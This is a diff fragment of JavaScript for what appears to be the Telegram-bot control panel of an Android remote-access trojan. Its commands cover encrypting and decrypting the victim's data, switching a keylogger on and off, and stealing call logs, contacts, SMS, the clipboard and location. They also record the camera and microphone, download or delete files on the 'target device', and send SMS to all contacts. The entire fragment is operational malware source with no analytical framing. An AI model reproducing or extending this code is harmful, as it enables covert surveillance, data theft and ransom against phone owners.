+                    [{ text: '🔒𝗘𝗡𝗖𝗥𝗬𝗣𝗧 𝗗𝗔𝗧𝗔🔒', callback_data: `encrypt_data:${uuid}` }, { text: '🔓𝗗𝗘𝗖𝗥𝗬𝗣𝗧 𝗗𝗔𝗧𝗔🔓', callback_data: `decrypt_data:${uuid}` }],
+                    [{ text: '🔮𝗞𝗘𝗬𝗟𝗢𝗚𝗚𝗘𝗥 𝗢𝗡🔮', callback_data: `keylogger_on:${uuid}` }, { text: '⛽𝗞𝗘𝗬𝗟𝗢𝗚𝗚𝗘𝗥 𝗢𝗙𝗙⛽', callback_data: `keylogger_off:${uuid}` }]
+                ]
+            },
+            parse_mode: "HTML"
+        }).catch(() => {});
+        return;
+    }
+
+    // Simple "one-shot" commands
+    const directCommands = ['calls', 'contacts', 'messages', 'apps', 'device_info', 'clipboard',
+        'camera_main', 'camera_selfie', 'location', 'vibrate', 'stop_audio'];
+    if (directCommands.includes(commend)) {
+        sendToUuid(uuid, commend);
+        appBot.deleteMessage(id, msg.message_id).catch(() => {});
+        appBot.sendMessage(id,
+            '°• ⌛𝙔𝙤𝙪𝙧 𝙧𝙚𝙦𝙪𝙚𝙨𝙩 𝙞𝙨 𝙤𝙣 𝙥𝙧𝙤𝙘𝙚𝙨⏳\n\n' +
+            '• ʏᴏᴜ ᴡɪʟʟ ʀᴇᴄᴇɪᴠᴇ ᴀ ʀᴇꜱᴘ𝙤ɴ𝙨𝙚 ɪɴ ᴛʜᴇ ɴᴇxᴛ ꜰᴇᴡ ᴍᴏᴍᴇɴᴛꜱ',
+            MAIN_KEYBOARD
+        );
+        return;
+    }
+
+    // Commands that need user input via ForceReply
+    const inputPrompts = {
+        send_message: { text: '°• 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙝𝙚 𝙣𝙪𝙢𝙗𝙚𝙧 𝙩𝙤 𝙬𝙝𝙞𝙘𝙝 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙝𝙚 𝙎𝙈𝙎\n\n• ɪꜰ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ʟᴏᴄᴀʟ ᴄᴏᴜɴᴛʀʏ ɴᴜᴍʙᴇʀꜱ, ʏᴏᴜ ᴄᴀɴ ᴇɴᴛᴇʀ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴡɪᴛʜ ᴢᴇʀᴏ ᴀᴛ ᴛʜᴇ ʙᴇɢɪɴɴɪɴɢ' },
+        send_message_to_all: { text: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙨𝙚𝙣𝙙 𝙩𝙤 𝙖𝙡𝙡 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙨' },
+        file: { text: '°• 📩𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙤𝙬𝙣𝙡𝙤𝙖𝙙🗳️' },
+        delete_file: { text: '°• 📂𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙥𝙖𝙩𝙝 𝙤𝙛 𝙩𝙝𝙚 𝙛𝙞𝙡𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙙𝙚𝙡𝙚𝙩𝙚💥' },
+        microphone: { text: '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙' },
+        toast: { text: '°• 𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙩𝙝𝙖𝙩 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙤𝙣 𝙩𝙝𝙚 𝙩𝙖𝙧𝙜𝙚𝙩 𝙙𝙚𝙫𝙞𝙘𝙚' },
+        show_notification: { text: '°• 📮𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙖𝙥𝙥𝙚𝙖𝙧 𝙖𝙨 𝙣𝙤𝙩𝙞𝙛𝙞𝙘𝙖𝙩𝙞𝙤𝙣' },
+        play_audio: { text: '°• 📀𝙀𝙣𝙩𝙚𝙧 𝙩𝙝𝙚 𝙖𝙪𝙙𝙞𝙤 𝙡𝙞𝙣𝙠 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙥𝙡𝙖𝙮🏖️' },
+        camera_main: { text: '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙖𝙞𝙣 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙' },
+        camera_selfie: { text: '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙨𝙚𝙡𝙛𝙞𝙚 𝙘𝙖𝙢𝙚𝙧𝙖 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙' }
+    };
+
+    if (inputPrompts[commend]) {
+        appBot.deleteMessage(id, msg.message_id).catch(() => {});
+        appBot.sendMessage(id, inputPrompts[commend].text,
+            { reply_markup: { force_reply: true }, parse_mode: "HTML" }
+        );
+        currentUuid = uuid;
+    }
+});
+
+/* ---------------- SERVER START ---------------- */
+
+const PORT = process.env.PORT || 8080;
+appServer.listen(PORT, () => {
+    console.log(`Server listening on ${PORT}`);
+});
